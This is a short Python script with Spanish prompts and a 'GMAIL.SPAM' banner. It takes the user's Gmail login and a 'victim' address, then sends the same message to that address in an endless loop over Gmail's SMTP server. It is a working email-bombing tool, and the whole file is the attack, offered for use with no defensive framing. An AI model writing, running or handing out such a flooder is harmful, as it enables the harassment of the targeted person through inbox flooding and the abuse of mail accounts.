import smtplib, ssl
import os
import time
import getpass

#colores
negro = '\033[30m'
rojo = '\033[31m'
verde = '\033[32m'
amarillo = '\033[33m'
azul = '\033[34m'
rosado = '\033[35m'
calipso= '\033[36m'
blanco = '\033[37m'
cierre = '\033[39m'

#script
os.system("clear")
time.sleep(1.0)


print(azul+" ██████╗ ███╗   ███╗ █████╗ ██╗██╗        ███████╗██████╗  █████╗ ███╗   ███╗  "+cierre)
print(azul+"██╔════╝ ████╗ ████║██╔══██╗██║██║        ██╔════╝██╔══██╗██╔══██╗████╗ ████║"+cierre)
print(azul+"██║  ███╗██╔████╔██║███████║██║██║        ███████╗██████╔╝███████║██╔████╔██║"+cierre)
print(azul+"██║   ██║██║╚██╔╝██║██╔══██║██║██║        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║"+cierre)
print(azul+"╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗██╗███████║██║     ██║  ██║██║ ╚═╝ ██║"+cierre)
print(azul+" ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝"+cierre)
                                                                             

print(rojo +"\t\t [*]Derechos reservados al programador" + cierre)
print(azul + "\t\t\t\tCripton666" + cierre)
print("\n")
c=input(amarillo+"Ingresar su cuenta de Gmail :" + cierre)
time.sleep(1.0)
p=getpass.getpass(amarillo+"Ingresar su Contraseña :" + cierre)
time.sleep(1.0)
destinatario=input(amarillo+"Correo de Victima:" + cierre)
time.sleep(1.0)
mensaje=input(azul+"Escriba el mensaje:" + cierre)

while True:
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(c, p)
        server.sendmail(c, destinatario, mensaje)
        print("Correo enviado")
